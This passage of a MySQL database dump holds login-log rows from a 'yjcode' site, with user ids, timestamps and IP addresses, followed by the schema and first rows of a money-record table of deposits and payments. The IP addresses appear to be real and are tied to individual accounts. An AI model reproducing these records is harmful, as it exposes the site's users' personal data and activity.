(817, 1, 204, '2018-10-01 01:54:01', '175.2.87.46'),
(818, 1, 194, '2018-10-03 00:52:33', '124.160.213.69'),
(819, 1, 205, '2018-10-04 22:13:47', '39.181.177.19'),
(820, 1, 206, '2018-10-04 23:18:54', '223.73.86.181'),
(821, 1, 207, '2018-10-06 19:40:21', '171.213.91.174'),
(822, 1, 207, '2018-10-06 21:45:28', '171.213.91.174'),
(823, 1, 207, '2018-10-06 21:45:37', '171.213.91.174'),
(824, 2, 6, '2018-10-10 13:17:38', '175.2.153.98'),
(825, 2, 16, '2018-10-10 13:34:35', '175.2.153.98'),
(826, 2, 6, '2018-10-10 18:03:10', '124.231.170.230'),
(827, 2, 6, '2018-10-10 20:16:07', '124.231.170.230'),
(828, 2, 6, '2018-10-10 20:16:27', '36.157.182.11'),
(829, 2, 6, '2018-10-10 20:17:32', '58.16.122.210'),
(830, 2, 6, '2018-10-10 20:20:55', '61.159.148.100'),
(831, 2, 6, '2018-10-10 20:41:57', '58.16.122.210'),
(832, 1, 15, '2018-10-11 20:33:34', '124.231.170.230'),
(833, 1, 208, '2018-10-12 11:06:55', '36.157.182.11'),
(834, 1, 122, '2018-10-12 13:38:16', '49.90.15.29'),
(835, 1, 209, '2018-10-12 14:47:51', '59.51.4.225'),
(836, 2, 6, '2018-10-12 15:29:53', '58.16.124.215'),
(837, 2, 6, '2018-10-12 20:59:26', '58.16.121.60'),
(838, 1, 210, '2018-10-12 22:46:27', '222.242.69.158'),
(839, 1, 211, '2018-10-13 22:27:06', '222.242.69.158'),
(840, 1, 212, '2018-10-13 22:29:04', '180.88.184.19'),
(841, 2, 6, '2018-10-17 23:06:21', '223.104.106.91'),
(842, 2, 17, '2018-10-18 19:47:59', '175.2.172.86'),
(843, 1, 213, '2018-10-23 13:18:06', '180.136.232.30'),
(844, 1, 214, '2018-10-25 10:37:49', '125.120.14.210'),
(845, 1, 15, '2018-10-25 10:48:54', '223.157.251.241'),
(846, 2, 6, '2018-10-26 19:50:36', '220.115.167.108'),
(847, 1, 169, '2018-10-27 18:43:16', '183.14.133.214'),
(848, 1, 15, '2018-10-27 18:56:26', '175.2.172.253'),
(849, 1, 169, '2018-10-27 19:04:22', '183.14.133.214'),
(850, 1, 15, '2018-10-27 22:38:14', '175.2.172.253'),
(851, 2, 18, '2018-10-28 21:20:38', '175.2.172.253'),
(852, 2, 6, '2018-10-29 19:43:37', '124.231.171.59'),
(853, 1, 215, '2018-11-01 14:41:11', '1.194.68.36'),
(854, 1, 215, '2018-11-02 10:13:18', '1.194.68.36'),
(855, 1, 215, '2018-11-05 09:48:07', '1.194.64.203'),
(856, 1, 15, '2018-11-05 14:08:42', '113.220.230.21'),
(857, 1, 215, '2018-11-05 17:59:44', '1.194.64.203'),
(858, 2, 19, '2018-11-05 21:46:46', '175.2.0.56'),
(859, 1, 215, '2018-11-06 11:44:23', '1.194.64.203'),
(860, 1, 215, '2018-11-07 10:33:55', '1.194.64.203'),
(861, 1, 216, '2018-11-07 11:02:11', '222.216.129.33'),
(862, 2, 6, '2018-11-07 16:43:04', '58.55.120.21'),
(863, 2, 6, '2018-11-07 18:42:24', '113.57.182.72'),
(864, 2, 6, '2018-11-07 18:44:34', '58.55.120.21'),
(865, 1, 188, '2018-11-07 18:45:44', '58.55.120.21'),
(866, 2, 6, '2018-11-13 16:28:05', '171.105.155.198'),
(867, 2, 20, '2018-11-17 17:24:56', '223.157.166.164'),
(868, 2, 20, '2018-11-18 14:31:49', '223.88.38.105'),
(869, 2, 20, '2018-11-18 15:18:15', '223.88.38.105'),
(870, 1, 217, '2018-11-18 15:21:33', '223.88.38.105'),
(871, 1, 218, '2018-11-29 11:53:41', '222.142.73.43'),
(872, 1, 15, '2018-11-30 17:41:41', '223.157.175.21'),
(873, 1, 199, '2018-12-01 21:03:45', '223.157.165.218'),
(874, 1, 15, '2018-12-01 21:14:38', '223.157.165.218'),
(875, 2, 21, '2018-12-01 21:15:48', '223.157.165.218'),
(876, 1, 199, '2018-12-01 21:20:32', '223.157.165.218'),
(877, 1, 15, '2018-12-01 21:22:19', '223.157.165.218'),
(878, 1, 199, '2018-12-01 21:22:58', '223.157.165.218'),
(879, 1, 199, '2018-12-01 21:37:40', '223.157.165.218'),
(880, 1, 15, '2018-12-01 22:28:20', '223.157.165.218'),
(881, 2, 22, '2018-12-01 22:30:19', '223.157.165.218'),
(882, 2, 24, '2018-12-01 22:41:19', '223.157.165.218'),
(883, 1, 219, '2018-12-01 22:44:44', '223.157.165.218'),
(884, 2, 26, '2018-12-02 01:02:45', '223.157.165.218'),
(885, 1, 199, '2018-12-08 00:06:34', '223.157.164.129'),
(886, 2, 6, '2018-12-08 17:11:45', '112.250.146.86'),
(887, 2, 6, '2018-12-11 13:12:58', '120.39.134.100'),
(888, 2, 6, '2018-12-11 13:14:22', '120.39.134.100'),
(889, 2, 6, '2018-12-11 13:19:04', '223.157.167.134'),
(890, 2, 6, '2018-12-11 13:19:43', '120.39.134.100'),
(891, 2, 6, '2018-12-11 13:26:21', '120.39.134.100'),
(892, 1, 220, '2018-12-11 14:30:37', '111.227.7.37'),
(893, 1, 221, '2018-12-19 23:22:13', '101.46.20.30'),
(894, 2, 6, '2018-12-23 19:57:43', '223.157.173.113'),
(895, 2, 6, '2018-12-23 20:43:20', '223.157.173.113'),
(896, 2, 26, '2018-12-23 20:47:12', '223.157.173.113'),
(897, 1, 15, '2018-12-23 23:56:10', '223.157.173.113'),
(898, 1, 222, '2018-12-24 12:12:27', '110.124.183.83'),
(899, 1, 15, '2018-12-24 18:05:26', '223.157.160.215'),
(900, 1, 15, '2018-12-24 20:15:00', '223.157.160.215'),
(901, 1, 15, '2018-12-26 17:37:49', '223.157.161.48'),
(902, 2, 6, '2018-12-27 00:17:29', '223.157.161.48'),
(903, 2, 27, '2018-12-27 00:21:26', '223.157.161.48'),
(904, 1, 218, '2018-12-27 17:30:05', '115.59.159.101'),
(905, 1, 223, '2018-12-29 19:50:29', '116.196.91.211'),
(906, 1, 224, '2019-01-01 06:51:10', '119.136.113.237'),
(907, 1, 149, '2019-01-01 14:40:53', '115.197.68.204'),
(908, 1, 97, '2019-01-03 15:44:56', '27.159.251.173'),
(909, 2, 6, '2019-01-06 19:52:08', '117.30.128.177'),
(910, 2, 6, '2019-01-06 20:40:06', '14.116.137.170'),
(911, 2, 6, '2019-01-06 22:43:48', '117.178.1.101'),
(912, 2, 6, '2019-01-08 12:03:31', '223.157.165.86'),
(913, 2, 6, '2019-01-08 19:55:34', '223.157.165.86'),
(914, 1, 225, '2019-01-08 22:19:22', '110.184.83.187'),
(915, 2, 6, '2019-01-09 15:18:29', '106.17.19.234'),
(916, 2, 28, '2019-01-10 14:16:40', '223.157.173.196'),
(917, 1, 15, '2019-01-10 14:35:41', '223.157.173.196'),
(918, 2, 28, '2019-01-10 14:44:02', '114.243.139.104'),
(919, 2, 6, '2019-01-10 14:44:12', '175.8.92.30'),
(920, 2, 6, '2019-01-10 17:17:41', '223.157.173.196'),
(921, 2, 28, '2019-01-11 15:22:05', '123.122.75.60'),
(922, 2, 6, '2019-01-13 00:36:11', '117.178.2.34'),
(923, 2, 28, '2019-01-15 11:12:26', '223.157.169.107'),
(924, 2, 6, '2019-01-15 15:21:24', '223.157.169.107'),
(925, 1, 15, '2019-01-15 15:39:03', '223.157.169.107'),
(926, 2, 28, '2019-01-15 15:41:14', '223.157.169.107'),
(927, 1, 226, '2019-01-17 13:40:16', '139.205.13.91'),
(928, 2, 6, '2019-01-17 15:44:10', '171.210.179.138'),
(929, 2, 6, '2019-01-17 17:00:17', '171.210.179.138'),
(930, 1, 226, '2019-01-17 17:26:41', '171.210.179.138'),
(931, 2, 6, '2019-01-17 18:01:59', '139.205.13.91'),
(932, 1, 15, '2019-01-17 19:14:26', '139.205.13.91'),
(933, 2, 6, '2019-01-17 20:25:28', '223.157.164.143'),
(934, 2, 6, '2019-01-19 01:54:23', '223.157.164.196'),
(935, 2, 6, '2019-01-20 10:52:32', '113.247.0.235'),
(936, 2, 6, '2019-01-20 10:52:57', '223.157.166.96'),
(937, 2, 6, '2019-01-20 12:26:45', '123.168.80.48'),
(938, 1, 227, '2019-01-20 22:01:39', '120.230.81.190'),
(939, 2, 6, '2019-01-21 16:20:44', '223.157.166.96'),
(940, 1, 199, '2019-01-22 20:36:12', '223.157.166.134'),
(941, 1, 228, '2019-01-26 22:06:32', '124.115.133.200'),
(942, 1, 229, '2019-02-17 22:29:54', '113.127.227.143'),
(943, 2, 29, '2019-02-24 19:13:28', '223.74.105.224'),
(944, 1, 230, '2019-02-24 20:43:11', '121.35.0.170'),
(945, 2, 6, '2019-02-27 19:18:36', '36.41.177.76'),
(946, 1, 231, '2019-03-01 00:11:56', '114.107.29.214'),
(947, 1, 232, '2019-03-01 03:22:16', '113.96.219.243'),
(948, 1, 233, '2019-03-01 11:07:23', '39.185.119.23'),
(949, 1, 233, '2019-03-01 13:07:08', '39.188.255.134'),
(950, 1, 234, '2019-03-02 17:34:23', '101.130.165.179'),
(951, 2, 6, '2019-03-08 15:09:57', '59.39.240.12'),
(952, 2, 6, '2019-03-08 15:43:57', '59.39.240.12'),
(953, 1, 235, '2019-03-20 23:12:35', '223.96.159.82'),
(954, 1, 235, '2019-03-20 23:14:31', '223.96.159.82'),
(955, 1, 236, '2019-03-21 15:49:03', '113.246.174.92'),
(956, 1, 236, '2019-03-22 12:19:21', '113.246.175.77'),
(957, 1, 236, '2019-03-22 13:36:17', '113.246.175.77'),
(958, 1, 237, '2019-03-22 15:03:26', '219.138.247.109'),
(959, 1, 199, '2019-03-22 20:56:17', '120.229.2.131'),
(960, 2, 6, '2019-03-25 10:35:17', '113.246.173.155'),
(961, 2, 5, '2019-03-25 21:03:16', '183.3.255.32'),
(962, 2, 5, '2019-03-25 21:25:35', '183.3.255.32'),
(963, 2, 5, '2019-03-28 14:30:29', '223.74.105.4'),
(964, 2, 5, '2019-03-28 14:30:51', '223.74.105.4'),
(965, 2, 6, '2019-03-28 20:33:10', '110.52.7.120'),
(966, 1, 238, '2019-03-29 15:58:16', '223.96.219.17'),
(967, 2, 29, '2019-03-31 20:16:02', '223.74.105.155'),
(968, 1, 15, '2019-03-31 20:45:30', '223.74.105.155'),
(969, 2, 29, '2019-03-31 20:50:33', '223.74.105.155'),
(970, 1, 15, '2019-04-01 13:48:57', '117.136.107.25'),
(971, 1, 15, '2019-04-01 22:30:19', '182.123.29.39'),
(972, 1, 239, '2019-04-03 09:38:40', '61.151.178.176'),
(973, 1, 240, '2019-04-05 18:29:34', '60.255.32.19'),
(974, 2, 6, '2019-04-06 21:53:17', '223.157.128.135'),
(975, 1, 15, '2019-04-08 00:01:43', '112.96.106.77'),
(976, 1, 15, '2019-04-08 00:02:35', '111.112.173.17'),
(977, 1, 15, '2019-04-08 00:05:47', '111.112.173.17'),
(978, 2, 30, '2019-04-08 12:58:22', '223.157.129.49'),
(979, 1, 240, '2019-04-08 22:34:27', '60.255.32.18'),
(980, 2, 6, '2019-04-09 09:57:34', '49.86.6.190'),
(981, 1, 241, '2019-04-11 18:08:28', '219.134.217.48'),
(982, 1, 242, '2019-04-11 19:12:24', '223.104.9.214'),
(983, 1, 243, '2019-04-13 11:47:54', '14.221.117.105'),
(984, 1, 244, '2019-04-13 14:52:03', '36.37.140.92'),
(985, 2, 6, '2019-04-17 19:38:38', '1.193.203.34'),
(986, 2, 31, '2019-04-17 21:04:37', '223.157.118.225'),
(1602, 2, 6, '2019-04-24 18:07:56', '223.157.128.194'),
(1601, 1, 15, '2019-04-24 17:37:30', '223.157.128.194'),
(1600, 2, 45, '2019-04-24 17:36:17', '223.157.128.194'),
(1599, 1, 846, '2019-04-24 17:30:30', '1.193.200.246'),
(1598, 1, 15, '2019-04-24 17:29:38', '223.157.128.194'),
(1597, 2, 6, '2019-04-23 23:15:47', '223.91.37.195'),
(1596, 2, 6, '2019-04-23 22:59:16', '223.91.37.195'),
(1092, 2, 6, '2019-04-20 14:34:40', '223.157.115.211'),
(1091, 1, 345, '2019-04-20 14:16:07', '223.157.115.211'),
(1090, 2, 39, '2019-04-20 14:15:58', '223.157.115.211'),
(1089, 2, 36, '2019-04-20 14:14:03', '223.157.115.211'),
(1088, 2, 34, '2019-04-18 16:57:24', '223.157.124.42'),
(1087, 2, 32, '2019-04-18 16:56:05', '223.157.124.42'),
(1690, 1, 928, '2019-04-30 14:21:35', '115.194.38.239'),
(1689, 1, 927, '2019-04-30 14:21:35', '115.194.38.239'),
(1688, 1, 926, '2019-04-30 14:21:35', '115.194.38.239'),
(1687, 1, 925, '2019-04-30 14:21:35', '115.194.38.239');
INSERT INTO `yjcode_loginlog` (`id`, `admin`, `userid`, `sj`, `uip`) VALUES
(1686, 1, 924, '2019-04-30 14:21:35', '115.194.38.239'),
(1685, 1, 923, '2019-04-30 14:21:35', '115.194.38.239'),
(1684, 1, 922, '2019-04-30 14:21:35', '115.194.38.239'),
(1683, 1, 921, '2019-04-30 14:21:35', '115.194.38.239'),
(1682, 1, 920, '2019-04-30 14:21:35', '115.194.38.239'),
(1681, 1, 919, '2019-04-30 14:21:35', '115.194.38.239'),
(1680, 1, 918, '2019-04-30 14:21:35', '115.194.38.239'),
(1679, 1, 917, '2019-04-30 14:21:35', '115.194.38.239'),
(1678, 1, 916, '2019-04-30 14:21:35', '115.194.38.239'),
(1677, 1, 915, '2019-04-30 14:21:35', '115.194.38.239'),
(1676, 1, 914, '2019-04-30 14:21:35', '115.194.38.239'),
(1675, 1, 913, '2019-04-30 14:21:35', '115.194.38.239'),
(1674, 1, 912, '2019-04-30 14:21:35', '115.194.38.239'),
(1673, 1, 911, '2019-04-30 14:21:35', '115.194.38.239'),
(1672, 1, 910, '2019-04-30 14:21:35', '115.194.38.239'),
(1671, 1, 909, '2019-04-30 14:21:35', '115.194.38.239'),
(1670, 1, 908, '2019-04-30 14:21:35', '115.194.38.239'),
(1669, 1, 907, '2019-04-30 14:21:35', '115.194.38.239'),
(1668, 1, 906, '2019-04-30 14:21:35', '115.194.38.239'),
(1667, 1, 905, '2019-04-30 14:21:35', '115.194.38.239'),
(1666, 1, 904, '2019-04-30 14:21:35', '115.194.38.239'),
(1665, 1, 903, '2019-04-30 14:21:35', '115.194.38.239'),
(1664, 1, 902, '2019-04-30 14:21:35', '115.194.38.239'),
(1663, 1, 901, '2019-04-30 14:21:35', '115.194.38.239'),
(1662, 1, 900, '2019-04-30 14:21:35', '115.194.38.239'),
(1661, 1, 899, '2019-04-30 14:21:35', '115.194.38.239'),
(1660, 1, 898, '2019-04-30 14:21:35', '115.194.38.239'),
(1659, 1, 897, '2019-04-30 14:21:35', '115.194.38.239'),
(1658, 1, 896, '2019-04-30 14:21:35', '115.194.38.239'),
(1657, 1, 895, '2019-04-30 14:21:35', '115.194.38.239'),
(1656, 1, 894, '2019-04-30 14:21:35', '115.194.38.239'),
(1655, 1, 893, '2019-04-30 14:21:35', '115.194.38.239'),
(1654, 1, 892, '2019-04-30 14:21:35', '115.194.38.239'),
(1653, 1, 891, '2019-04-30 14:21:35', '115.194.38.239'),
(1652, 1, 890, '2019-04-30 14:21:35', '115.194.38.239'),
(1651, 1, 889, '2019-04-30 14:21:35', '115.194.38.239'),
(1650, 1, 888, '2019-04-30 14:21:35', '115.194.38.239'),
(1649, 1, 887, '2019-04-30 14:21:35', '115.194.38.239'),
(1648, 1, 886, '2019-04-30 14:21:35', '115.194.38.239'),
(1647, 1, 885, '2019-04-30 14:21:35', '115.194.38.239'),
(1642, 1, 880, '2019-04-30 14:21:35', '115.194.38.239'),
(1641, 1, 879, '2019-04-30 14:21:35', '115.194.38.239'),
(1640, 1, 878, '2019-04-30 14:21:35', '115.194.38.239'),
(1639, 1, 877, '2019-04-30 14:21:35', '115.194.38.239'),
(1638, 1, 876, '2019-04-30 14:21:35', '115.194.38.239'),
(1637, 1, 875, '2019-04-30 14:21:35', '115.194.38.239'),
(1636, 1, 874, '2019-04-30 14:21:34', '115.194.38.239'),
(1635, 1, 873, '2019-04-30 14:21:34', '115.194.38.239'),
(1634, 1, 872, '2019-04-30 14:21:34', '115.194.38.239'),
(1633, 1, 871, '2019-04-30 14:21:34', '115.194.38.239'),
(1632, 1, 870, '2019-04-30 14:21:34', '115.194.38.239'),
(1631, 1, 869, '2019-04-30 14:21:34', '115.194.38.239'),
(1630, 1, 868, '2019-04-30 14:21:34', '115.194.38.239'),
(1629, 1, 867, '2019-04-30 14:21:34', '115.194.38.239'),
(1628, 1, 866, '2019-04-30 14:21:34', '115.194.38.239'),
(1627, 1, 865, '2019-04-30 14:21:34', '115.194.38.239'),
(1626, 1, 864, '2019-04-30 14:21:34', '115.194.38.239'),
(1625, 1, 863, '2019-04-30 14:21:34', '115.194.38.239'),
(1624, 1, 862, '2019-04-30 14:21:34', '115.194.38.239'),
(1623, 1, 861, '2019-04-30 14:21:34', '115.194.38.239'),
(1622, 1, 860, '2019-04-30 14:21:34', '115.194.38.239'),
(1621, 1, 859, '2019-04-30 14:21:34', '115.194.38.239'),
(1620, 1, 858, '2019-04-30 14:21:34', '115.194.38.239'),
(1619, 1, 857, '2019-04-30 14:21:34', '115.194.38.239'),
(1618, 1, 856, '2019-04-30 14:21:34', '115.194.38.239'),
(1617, 1, 855, '2019-04-30 14:21:34', '115.194.38.239'),
(1616, 1, 854, '2019-04-30 14:21:34', '115.194.38.239'),
(1615, 1, 853, '2019-04-30 14:21:34', '115.194.38.239'),
(1614, 1, 852, '2019-04-30 14:21:34', '115.194.38.239'),
(1613, 1, 851, '2019-04-30 14:21:34', '115.194.38.239'),
(1612, 1, 850, '2019-04-30 14:21:34', '115.194.38.239'),
(1611, 2, 6, '2019-04-30 14:19:51', '115.194.38.239'),
(1610, 2, 6, '2019-04-30 14:15:36', '223.157.119.86'),
(1609, 2, 6, '2019-04-30 14:06:55', '115.194.38.239'),
(1608, 1, 849, '2019-04-29 00:59:27', '112.224.33.133'),
(1607, 1, 849, '2019-04-29 00:39:14', '112.224.33.133'),
(1606, 1, 848, '2019-04-27 02:52:10', '171.37.28.16'),
(1645, 1, 883, '2019-04-30 14:21:35', '115.194.38.239'),
(1644, 1, 882, '2019-04-30 14:21:35', '115.194.38.239'),
(1643, 1, 881, '2019-04-30 14:21:35', '115.194.38.239'),
(1605, 1, 15, '2019-04-27 00:30:13', '223.157.115.111'),
(1604, 2, 6, '2019-04-25 10:54:42', '183.205.179.2'),
(1603, 1, 847, '2019-04-25 10:49:37', '183.205.179.2'),
(1691, 1, 929, '2019-04-30 14:21:35', '115.194.38.239'),
(1692, 1, 930, '2019-04-30 14:21:35', '115.194.38.239'),
(1693, 1, 931, '2019-04-30 14:21:35', '115.194.38.239'),
(1694, 1, 932, '2019-04-30 14:21:35', '115.194.38.239'),
(1695, 1, 933, '2019-04-30 14:21:35', '115.194.38.239'),
(1646, 1, 884, '2019-04-30 14:21:35', '115.194.38.239'),
(1713, 2, 6, '2019-05-02 16:23:13', '223.157.125.5'),
(1712, 1, 950, '2019-04-30 14:21:35', '115.194.38.239'),
(1711, 1, 949, '2019-04-30 14:21:35', '115.194.38.239'),
(1710, 1, 948, '2019-04-30 14:21:35', '115.194.38.239'),
(1709, 1, 947, '2019-04-30 14:21:35', '115.194.38.239'),
(1708, 1, 946, '2019-04-30 14:21:35', '115.194.38.239'),
(1707, 1, 945, '2019-04-30 14:21:35', '115.194.38.239'),
(1706, 1, 944, '2019-04-30 14:21:35', '115.194.38.239'),
(1705, 1, 943, '2019-04-30 14:21:35', '115.194.38.239'),
(1704, 1, 942, '2019-04-30 14:21:35', '115.194.38.239'),
(1703, 1, 941, '2019-04-30 14:21:35', '115.194.38.239'),
(1702, 1, 940, '2019-04-30 14:21:35', '115.194.38.239'),
(1701, 1, 939, '2019-04-30 14:21:35', '115.194.38.239'),
(1700, 1, 938, '2019-04-30 14:21:35', '115.194.38.239'),
(1699, 1, 937, '2019-04-30 14:21:35', '115.194.38.239'),
(1698, 1, 936, '2019-04-30 14:21:35', '115.194.38.239'),
(1697, 1, 935, '2019-04-30 14:21:35', '115.194.38.239'),
(1696, 1, 934, '2019-04-30 14:21:35', '115.194.38.239'),
(1593, 2, 6, '2019-04-23 13:44:52', '223.157.128.30'),
(1594, 2, 39, '2019-04-23 13:50:32', '223.157.128.30'),
(1595, 2, 43, '2019-04-23 14:04:01', '223.157.128.30'),
(1714, 1, 15, '2019-05-07 17:33:42', '223.157.130.24'),
(1715, 1, 15, '2019-05-07 17:39:20', '58.20.184.66'),
(1716, 2, 6, '2019-05-07 19:50:42', '115.206.16.14'),
(1717, 1, 149, '2019-05-07 19:54:22', '115.206.16.14'),
(1718, 1, 15, '2019-05-10 11:53:01', '223.157.127.77'),
(1719, 1, 15, '2019-05-10 12:07:22', '120.229.93.169'),
(1720, 1, 951, '2019-05-10 14:49:06', '111.37.249.129'),
(1721, 1, 952, '2019-05-11 16:40:01', '125.127.38.92'),
(1722, 2, 46, '2019-05-12 01:12:56', '223.157.119.76'),
(1723, 2, 48, '2019-05-12 01:13:59', '223.157.119.76'),
(1724, 2, 6, '2019-05-13 13:19:54', '42.236.177.24'),
(1725, 1, 953, '2019-05-13 13:44:37', '42.236.177.24'),
(1726, 2, 6, '2019-05-13 13:47:45', '223.157.124.203'),
(1727, 1, 954, '2019-05-13 14:54:31', '42.236.177.24'),
(1728, 1, 955, '2019-05-13 14:54:31', '42.236.177.24'),
(1729, 2, 50, '2019-05-13 15:38:37', '223.157.124.203'),
(1730, 1, 15, '2019-05-13 17:39:56', '223.157.124.203'),
(1731, 1, 15, '2019-05-13 17:41:38', '113.56.200.71'),
(1732, 1, 15, '2019-05-14 13:18:30', '113.56.206.106'),
(1733, 2, 6, '2019-05-15 19:45:01', '223.96.217.39'),
(1734, 1, 15, '2019-05-16 00:28:43', '223.157.128.148'),
(1735, 1, 952, '2019-05-17 15:47:17', '125.127.38.54'),
(1736, 2, 6, '2019-05-17 17:19:25', '223.96.217.39'),
(1737, 1, 952, '2019-05-18 13:53:30', '125.127.38.54'),
(1738, 1, 956, '2019-05-26 12:03:00', '61.151.178.167'),
(1739, 2, 51, '2019-05-27 22:14:20', '223.157.119.254'),
(1740, 2, 53, '2019-05-27 23:15:57', '223.157.119.254'),
(1741, 1, 15, '2019-05-27 23:31:31', '223.157.119.254'),
(1742, 1, 15, '2019-05-27 23:54:28', '223.157.119.254'),
(1743, 2, 55, '2019-05-28 14:06:58', '223.157.119.254'),
(1744, 2, 57, '2019-05-28 14:35:35', '223.157.119.254'),
(1745, 2, 58, '2019-05-28 18:08:23', '223.157.119.254'),
(1746, 2, 6, '2019-05-28 19:58:57', '182.104.15.160'),
(1747, 1, 957, '2019-05-28 20:42:48', '182.97.64.138'),
(1748, 2, 6, '2019-05-29 16:01:49', '117.150.215.148'),
(1749, 2, 59, '2019-06-01 16:50:08', '223.157.116.113'),
(1750, 2, 64, '2019-06-01 16:52:19', '223.157.116.113'),
(1752, 1, 959, '2019-06-01 16:55:17', '223.157.116.113'),
(1753, 2, 6, '2019-06-03 01:04:22', '117.136.31.241'),
(1754, 2, 65, '2019-06-04 09:58:19', '223.157.130.61'),
(1755, 2, 67, '2019-06-04 10:00:07', '223.157.130.61'),
(1756, 1, 960, '2019-06-05 16:01:04', '113.65.214.4'),
(1757, 1, 961, '2019-06-06 16:02:15', '111.226.203.167'),
(1758, 1, 962, '2019-06-07 23:45:24', '49.74.37.184'),
(1759, 2, 6, '2019-06-08 00:02:12', '58.46.62.91'),
(1760, 2, 69, '2019-06-08 01:32:49', '58.46.62.91'),
(1761, 2, 72, '2019-06-08 01:34:28', '58.46.62.91'),
(1762, 1, 15, '2019-06-08 01:59:30', '58.46.62.91'),
(1763, 2, 73, '2019-06-08 20:45:41', '223.159.252.9'),
(1764, 1, 15, '2019-06-08 20:56:02', '223.159.252.9'),
(1765, 1, 15, '2019-06-08 21:41:35', '223.159.252.9'),
(1766, 2, 75, '2019-06-08 22:32:02', '223.159.252.9'),
(1767, 1, 15, '2019-06-08 22:33:49', '223.159.252.9'),
(1768, 2, 76, '2019-06-09 02:11:03', '223.159.252.9'),
(1769, 2, 78, '2019-06-09 11:42:58', '223.159.252.9'),
(1770, 1, 15, '2019-06-09 12:02:50', '120.243.52.232'),
(1771, 1, 15, '2019-06-09 12:44:35', '223.159.252.9'),
(1772, 2, 79, '2019-06-09 17:01:05', '223.159.252.9'),
(1773, 2, 80, '2019-06-09 22:10:14', '223.159.252.9'),
(1774, 2, 82, '2019-06-09 23:23:17', '223.159.252.9'),
(1775, 2, 83, '2019-06-10 11:12:57', '223.159.253.11'),
(1776, 2, 85, '2019-06-10 11:58:01', '223.159.253.11'),
(1777, 2, 86, '2019-06-10 17:17:45', '223.159.253.11'),
(1778, 1, 963, '2019-06-11 17:24:48', '122.96.47.132'),
(1779, 2, 87, '2019-06-12 03:59:43', '58.46.62.188'),
(1780, 2, 89, '2019-06-12 04:01:25', '58.46.62.188'),
(1781, 1, 15, '2019-06-12 19:03:22', '58.46.62.188'),
(1782, 2, 91, '2019-06-12 19:59:36', '58.46.62.188'),
(1783, 1, 15, '2019-06-13 01:56:24', '58.46.62.188'),
(1784, 2, 6, '2019-06-13 01:59:51', '123.151.76.248'),
(1785, 2, 6, '2019-06-13 02:05:35', '123.151.76.248'),
(1786, 2, 6, '2019-06-13 12:44:08', '123.151.76.248'),
(1787, 2, 6, '2019-06-13 13:20:31', '58.46.60.119'),
(1788, 1, 964, '2019-06-14 09:50:02', '118.249.120.92'),
(1789, 2, 92, '2019-06-14 12:40:06', '58.46.60.119'),
(1790, 2, 94, '2019-06-14 12:51:37', '58.46.60.119'),
(1791, 1, 965, '2019-06-14 14:09:41', '1.194.64.111'),
(1792, 2, 96, '2019-06-15 00:43:39', '58.46.60.119'),
(1793, 1, 966, '2019-06-15 03:07:21', '180.123.223.218'),
(1794, 2, 6, '2019-06-16 21:20:13', '58.46.60.119'),
(1795, 2, 6, '2019-06-16 23:36:41', '58.46.60.119'),
(1796, 1, 967, '2019-06-16 23:36:45', '106.58.231.149'),
(1797, 1, 15, '2019-06-16 23:38:16', '58.46.60.119'),
(1798, 1, 968, '2019-06-17 11:15:20', '42.236.179.84'),
(1799, 2, 6, '2019-06-17 18:30:49', '58.46.60.119'),
(1800, 1, 15, '2019-06-17 18:32:22', '58.46.60.119'),
(1801, 2, 6, '2019-06-17 23:42:05', '58.46.60.119'),
(1802, 2, 6, '2019-06-18 10:06:46', '58.46.60.119'),
(1803, 2, 97, '2019-06-18 20:13:49', '58.46.60.119'),
(1804, 2, 100, '2019-06-18 20:15:18', '58.46.60.119'),
(1805, 2, 6, '2019-06-18 21:28:02', '58.46.60.119'),
(1806, 1, 952, '2019-06-19 16:27:15', '125.127.39.47'),
(1807, 2, 6, '2019-06-19 16:37:14', '58.46.60.119'),
(1808, 1, 969, '2019-06-19 16:42:39', '219.157.183.249'),
(1809, 1, 970, '2019-06-19 16:46:14', '219.157.183.249'),
(1810, 2, 6, '2019-06-20 00:05:54', '58.46.60.119'),
(1811, 1, 952, '2019-06-20 11:39:00', '125.127.39.47'),
(1812, 2, 6, '2019-06-21 02:04:56', '58.46.62.8'),
(1813, 2, 6, '2019-06-21 02:12:38', '58.46.62.8'),
(1814, 1, 971, '2019-06-21 02:28:07', '111.174.81.55'),
(1815, 1, 972, '2019-06-21 04:20:06', '58.243.254.3'),
(1816, 2, 101, '2019-06-21 04:49:00', '58.46.62.8'),
(1817, 1, 15, '2019-06-21 05:11:06', '58.46.62.8'),
(1818, 1, 973, '2019-06-21 09:43:08', '1.194.69.228'),
(1819, 2, 6, '2019-06-21 15:14:46', '58.46.62.8'),
(1820, 1, 974, '2019-06-21 16:09:12', '119.130.215.237'),
(1821, 2, 6, '2019-06-21 16:15:57', '58.46.62.8'),
(1822, 2, 101, '2019-06-22 14:24:42', '127.0.0.1'),
(1823, 2, 101, '2019-08-28 17:41:23', '127.0.0.1'),
(1824, 2, 101, '2019-10-03 10:45:50', '127.0.0.1'),
(1825, 2, 101, '2019-10-12 22:01:11', '127.0.0.1'),
(1826, 2, 101, '2019-10-22 21:01:14', '127.0.0.1'),
(1827, 2, 101, '2019-10-22 23:44:43', '127.0.0.1'),
(1828, 2, 101, '2019-10-24 18:06:47', '::1'),
(1829, 2, 101, '2019-10-24 18:21:31', '::1'),
(1830, 2, 101, '2019-10-25 10:22:07', '::1');

-- --------------------------------------------------------

--
-- 表的结构 `yjcode_moneyrecord`
--

CREATE TABLE IF NOT EXISTS `yjcode_moneyrecord` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `bh` char(50) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `tit` varchar(250) DEFAULT NULL,
  `moneynum` float DEFAULT NULL,
  `sj` datetime DEFAULT NULL,
  `uip` char(40) DEFAULT NULL,
  `admin` int(10) DEFAULT NULL,
  `rengbh` varchar(100) DEFAULT NULL,
  `jyh` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC AUTO_INCREMENT=1139 ;

--
-- 转存表中的数据 `yjcode_moneyrecord`
--

INSERT INTO `yjcode_moneyrecord` (`id`, `bh`, `userid`, `tit`, `moneynum`, `sj`, `uip`, `admin`, `rengbh`, `jyh`) VALUES
(3, '1488455486', 14, '注册会员赠送金额', 1, '2017-03-02 19:51:26', '113.220.166.102', NULL, NULL, NULL),
(4, '1488513812', 14, '帐户金额充值', 9000, '2017-03-03 12:03:32', '223.157.131.226', NULL, NULL, NULL),
(5, '1488513860', 14, '发布任务预付订金(任务编号1488513860task14)', -500, '2017-03-03 12:04:20', '223.157.131.226', NULL, NULL, NULL),
